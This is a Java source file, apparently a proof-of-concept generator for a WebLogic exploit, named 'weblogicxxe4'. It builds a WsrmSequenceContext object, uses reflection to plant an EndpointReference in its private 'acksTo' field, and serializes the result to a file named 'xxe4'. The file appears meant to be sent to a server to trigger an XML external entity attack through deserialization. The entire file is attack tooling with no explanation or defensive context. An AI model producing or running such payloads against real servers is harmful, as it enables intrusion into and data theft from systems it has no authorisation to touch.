import weblogic.wsee.addressing.EndpointReference;
import weblogic.wsee.reliability.WsrmSequenceContext;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;

public class weblogicxxe4 {
    public static void main(String[] args) throws IOException {
        Object instance = getXXEObject();
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("xxe4"));
        out.writeObject(instance);
        out.flush();
        out.close();
    }

    public static Object getXXEObject() {
        EndpointReference  end = new EndpointReference();
        WsrmSequenceContext umh = new WsrmSequenceContext();

        try {
            Field f1 = umh.getClass().getDeclaredField("acksTo");
            f1.setAccessible(true);
            f1.set(umh, end);

        } catch (Exception e) {
            e.printStackTrace();
        }
         return umh;
    }
}
